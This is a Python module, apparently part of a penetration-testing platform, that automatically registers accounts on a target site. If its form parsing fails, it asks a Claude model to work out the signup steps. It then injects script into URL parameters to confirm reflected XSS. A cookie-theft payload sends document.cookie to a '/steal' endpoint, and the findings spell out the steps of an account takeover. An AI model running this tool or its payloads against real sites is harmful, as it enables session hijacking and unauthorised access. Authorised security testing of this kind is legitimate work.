"""XSS Proof runner — confirms cookie theft via reflected XSS with authenticated session.

Strategy (most-generic-first):
1. Parse HTML forms on login/register pages → submit with detected method/action
2. If no cookie: Claude API on-the-fly analyzes the page and determines auth steps
3. Execute AI-determined steps → get session cookie
4. Check Set-Cookie for HttpOnly flag
5. Confirm XSS payload reflects unencoded in HTML response
6. CRITICAL finding if XSS + stealable cookie; HIGH if XSS + HttpOnly

The AI fallback makes this work for any target, not just known patterns.
"""
from __future__ import annotations

import json
import logging
import os
import random
import re
import string
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import httpx as httpx_client

from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

logger = logging.getLogger(__name__)

XSS_PROOF_RESULTS_ARTIFACT_NAME = "xss-proof-results.json"

COOKIE_THEFT_PAYLOAD = (
    "<script>document.location='https://proof.aegispt.local/steal?c='+"
    "encodeURIComponent(document.cookie)</script>"
)
CONFIRM_PAYLOAD = "<script>alert(document.cookie+'AEGISPT_XSS_PROOF')</script>"
MARKER = "AEGISPT_XSS_PROOF"


def _artifact(name: str, data: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(data, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _random_creds() -> tuple[str, str]:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"aegispt_{suffix}", f"Proof!{suffix}"


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    replaced = [(k, payload if k == param else v) for k, v in params]
    if not any(k == param for k, _ in params):
        replaced.append((param, payload))
    return urlunparse(parsed._replace(query=urlencode(replaced)))


def _discover_auth_forms(client: httpx_client.Client, base_url: str) -> list[dict[str, Any]]:
    """Fetch login/register pages and extract form actions, methods, and fields."""
    parsed = urlparse(base_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
    instance_prefix = f"/{path_parts[0]}" if path_parts else ""

    candidate_pages = [
        base_url,
        f"{base_origin}{instance_prefix}/newaccount.gtl",
        f"{base_origin}{instance_prefix}/login",
        f"{base_origin}{instance_prefix}/register",
        f"{base_origin}{instance_prefix}/signup",
    ]

    forms: list[dict[str, Any]] = []
    for page_url in candidate_pages:
        try:
            resp = client.get(page_url)
            if resp.status_code >= 400:
                continue
            html = resp.text

            for form_match in re.finditer(
                r'<form([^>]*)>(.*?)</form>', html, re.DOTALL | re.IGNORECASE
            ):
                attrs_raw = form_match.group(1)
                form_body = form_match.group(2)

                action_m = re.search(r'action=["\']([^"\']*)["\']', attrs_raw, re.IGNORECASE)
                method_m = re.search(r'method=["\']([^"\']*)["\']', attrs_raw, re.IGNORECASE)

                action = action_m.group(1) if action_m else page_url
                method = (method_m.group(1) if method_m else "post").upper()

                full_action = urljoin(base_origin, action) if not action.startswith("http") else action

                fields: dict[str, str] = {}
                for inp in re.finditer(
                    r'<input([^>]*)/?>', form_body, re.IGNORECASE
                ):
                    inp_attrs = inp.group(1)
                    name_m = re.search(r'name=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                    value_m = re.search(r'value=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                    if name_m:
                        fields[name_m.group(1)] = value_m.group(1) if value_m else ""

                forms.append({
                    "source_page": page_url,
                    "action": full_action,
                    "method": method,
                    "fields": fields,
                })
        except httpx_client.HTTPError:
            continue

    return forms


def _try_register(
    client: httpx_client.Client, base_url: str
) -> dict[str, Any]:
    """Discover and submit registration forms. Returns auth info if successful."""
    username, password = _random_creds()

    forms = _discover_auth_forms(client, base_url)

    for form in forms:
        fields = dict(form["fields"])
        action = form["action"]
        method = form["method"]

        # Detect registration forms by field names or action URL
        action_lower = action.lower()
        field_names = set(fields.keys())
        is_reg_form = (
            "newaccount" in action_lower
            or "saveprofile" in action_lower
            or "register" in action_lower
            or "signup" in action_lower
            or ("uid" in field_names and "pw" in field_names)
            or ("username" in field_names and "password" in field_names)
        )
        if not is_reg_form:
            continue

        # Fill credentials into the right fields
        fill_map = {
            "uid": username, "username": username, "user": username, "name": username,
            "pw": password, "password": password, "pass": password,
            "pw2": password, "password2": password, "confirm": password, "verify": password,
        }
        for field, default_val in fields.items():
            if field.lower() in fill_map:
                fields[field] = fill_map[field.lower()]
            elif not default_val:
                fields[field] = ""  # keep empty hidden fields as-is

        # Keep hidden fields as-is (e.g. action=new, is_author=True)

        try:
            if method == "GET":
                resp = client.get(action, params=fields)
            else:
                resp = client.post(action, data=fields)

            if resp.status_code >= 500:
                continue

            # Check for session cookie in response or client jar
            cookies = dict(resp.cookies) or dict(client.cookies)
            if cookies:
                cookie_name, cookie_value = next(iter(cookies.items()))
                cookie_header = resp.headers.get("set-cookie", "")
                httponly = "httponly" in cookie_header.lower()
                return {
                    "username": username,
                    "password": password,
                    "cookie_name": cookie_name,
                    "cookie_value": cookie_value,
                    "httponly": httponly,
                    "reg_action": action,
                    "reg_method": method,
                }

        except httpx_client.HTTPError:
            continue

    return {}


def _ai_analyze_auth(base_url: str, page_html: str) -> list[dict[str, Any]]:
    """Ask Claude to analyze the page and return HTTP steps to create a test account.

    Returns a list of step dicts: [{method, url, params, data, description}]
    Returns [] if no API key configured or call fails.
    """
    api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if not api_key:
        return []

    try:
        import anthropic

        client = anthropic.Anthropic(api_key=api_key)
        username = f"aegispt_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
        password = f"Proof!{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"

        prompt = f"""You are a security testing assistant. Analyze this web application page and determine how to create a test account.

Target URL: {base_url}
Username to use: {username}
Password to use: {password}

HTML page content:
{page_html[:8000]}

Return ONLY valid JSON — a list of HTTP request steps to register/create the test account.
Each step: {{"method": "GET"|"POST", "url": "full URL", "params": {{}}, "data": {{}}, "description": "what this does"}}

Rules:
- Use the exact form action URL from the HTML (resolve relative URLs against the base)
- Use the exact HTTP method from the form tag
- Include all hidden form fields with their original values
- Replace username/password fields with: {username} / {password}
- If registration requires multiple steps, include all steps in order
- Return [] if you cannot determine the registration flow

JSON only, no explanation:"""

        message = client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=1024,
            messages=[{"role": "user", "content": prompt}],
        )
        raw = message.content[0].text.strip()
        # Extract JSON array from response
        json_match = re.search(r"\[.*\]", raw, re.DOTALL)
        if json_match:
            steps = json.loads(json_match.group(0))
            return steps if isinstance(steps, list) else []
    except Exception as exc:
        logger.debug("AI auth analysis failed: %s", exc)

    return []


def _try_register_with_ai(
    client: httpx_client.Client, base_url: str, page_html: str
) -> dict[str, Any]:
    """Use Claude to determine registration steps, then execute them."""
    steps = _ai_analyze_auth(base_url, page_html)
    if not steps:
        return {}

    for step in steps:
        method = str(step.get("method", "POST")).upper()
        url = str(step.get("url", ""))
        params = step.get("params") or {}
        data = step.get("data") or {}

        if not url:
            continue
        try:
            if method == "GET":
                resp = client.get(url, params={**params, **data})
            else:
                resp = client.post(url, params=params, data=data)

            cookies = dict(resp.cookies) or dict(client.cookies)
            if cookies:
                cookie_name, cookie_value = next(iter(cookies.items()))
                cookie_header = resp.headers.get("set-cookie", "")
                httponly = "httponly" in cookie_header.lower()
                return {
                    "username": data.get("uid") or data.get("username") or "ai-registered",
                    "cookie_name": cookie_name,
                    "cookie_value": cookie_value,
                    "httponly": httponly,
                    "reg_action": url,
                    "reg_method": method,
                    "ai_determined": True,
                    "steps_executed": len(steps),
                }
        except httpx_client.HTTPError:
            continue

    return {}


def execute_xss_proof(
    targets: list[str],
    *,
    xss_findings: list[dict[str, Any]] | None = None,
    timeout_seconds: float = 20.0,
) -> RunnerExecution:
    if not targets:
        raise ValueError("at least one target is required")

    base_target = normalize_http_target(targets[0])
    findings: list[dict[str, Any]] = []
    checks: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with httpx_client.Client(follow_redirects=True, timeout=timeout_seconds) as client:
        # Step 1: HTML form discovery (generic — reads method/action from actual HTML)
        auth = _try_register(client, base_target)

        # Step 2: AI fallback — if HTML parsing didn't yield a cookie,
        # ask Claude to analyze the page and determine the correct auth flow.
        if not auth:
            try:
                page_resp = client.get(base_target)
                page_html = page_resp.text
            except httpx_client.HTTPError:
                page_html = ""
            if page_html:
                auth = _try_register_with_ai(client, base_target, page_html)
                if auth:
                    stderr_lines.append(
                        f"HTML form parsing failed; AI-determined registration succeeded "
                        f"(ai_determined=True, steps={auth.get('steps_executed', '?')})"
                    )

        session_cookie_name = auth.get("cookie_name", "")
        stealable = bool(session_cookie_name and not auth.get("httponly", True))

        # Step 2: determine XSS targets
        xss_to_test: list[tuple[str, list[str]]] = []
        if xss_findings:
            for f in xss_findings:
                vuln_url = str(f.get("target") or f.get("url") or base_target)
                params = list(f.get("tested_params") or f.get("params") or [])
                if vuln_url and params:
                    xss_to_test.append((vuln_url, params))
        if not xss_to_test:
            xss_to_test = [(base_target, ["uid", "q", "search", "name", "input", "id"])]

        # Step 3: test each XSS sink
        for vuln_url, params in xss_to_test:
            for param in params:
                injected = _inject_param(vuln_url, param, CONFIRM_PAYLOAD)
                try:
                    response = client.get(injected)
                except httpx_client.HTTPError as exc:
                    stderr_lines.append(f"XSS check failed {injected}: {exc}")
                    continue

                body = response.text or ""
                payload_reflected = MARKER in body
                content_type = response.headers.get("content-type", "").lower()
                html_context = "text/html" in content_type or not content_type

                check: dict[str, Any] = {
                    "target": vuln_url,
                    "param": param,
                    "injected_url": str(injected)[:500],
                    "status_code": response.status_code,
                    "payload_reflected": payload_reflected,
                    "html_context": html_context,
                    "session_cookie_name": session_cookie_name or None,
                    "session_cookie_stealable": stealable,
                    "httponly": auth.get("httponly"),
                    "auth_registered": bool(auth),
                    "registered_user": auth.get("username"),
                }
                checks.append(check)

                if payload_reflected and html_context and stealable:
                    exploit_url = _inject_param(vuln_url, param, COOKIE_THEFT_PAYLOAD)
                    findings.append({
                        "type": "xss_cookie_theft_confirmed",
                        "title": f"Session Cookie Theft via XSS — CRITICAL ({param})",
                        "severity": "critical",
                        "target": vuln_url,
                        "summary": (
                            f"Reflected XSS in '{param}' confirmed executable in HTML context. "
                            f"Session cookie '{session_cookie_name}' has no HttpOnly flag — "
                            f"readable via document.cookie. "
                            f"Victim account takeover requires a single click on the exploit URL."
                        ),
                        "evidence": {
                            **check,
                            "exploit_url": str(exploit_url)[:500],
                            "attack_steps": [
                                f"1. Attacker sends victim: {str(exploit_url)[:200]}",
                                "2. Browser executes <script> — document.cookie readable (no HttpOnly)",
                                f"3. '{session_cookie_name}' token sent to attacker server",
                                "4. Attacker replays cookie → full account access without credentials",
                            ],
                            "registered_as": auth.get("username"),
                            "registration_endpoint": auth.get("reg_action"),
                        },
                    })
                elif payload_reflected and html_context:
                    findings.append({
                        "type": "xss_confirmed_cookie_protected",
                        "title": f"Reflected XSS Confirmed — Cookie HttpOnly Protected ({param})",
                        "severity": "high",
                        "target": vuln_url,
                        "summary": (
                            f"XSS payload reflected and executable for '{param}'. "
                            f"Cookie has HttpOnly — direct theft limited. "
                            f"DOM manipulation, phishing, and keylogging remain possible."
                        ),
                        "evidence": check,
                    })
                elif payload_reflected:
                    findings.append({
                        "type": "xss_reflected_non_html",
                        "title": f"XSS Payload Reflected (non-HTML context) ({param})",
                        "severity": "medium",
                        "target": vuln_url,
                        "summary": "Payload reflected but not in HTML — execution context unclear.",
                        "evidence": check,
                    })

    result = {
        "tool": "xss-proof",
        "targets": [base_target],
        "checks": checks,
        "findings": findings,
        "summary": {
            "finding_count": len(findings),
            "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
            "high_count": sum(1 for f in findings if f.get("severity") == "high"),
            "stealable_cookies_found": stealable,
            "stealable_cookie_names": [session_cookie_name] if stealable else [],
            "auth_registered": bool(auth),
            "registered_user": auth.get("username") if auth else None,
        },
    }

    return RunnerExecution(
        tool="xss-proof",
        exit_code=exit_code,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={"status": "ok", "tool_version": "xss-proof:v3"},
        artifacts=[_artifact(XSS_PROOF_RESULTS_ARTIFACT_NAME, result)],
    )
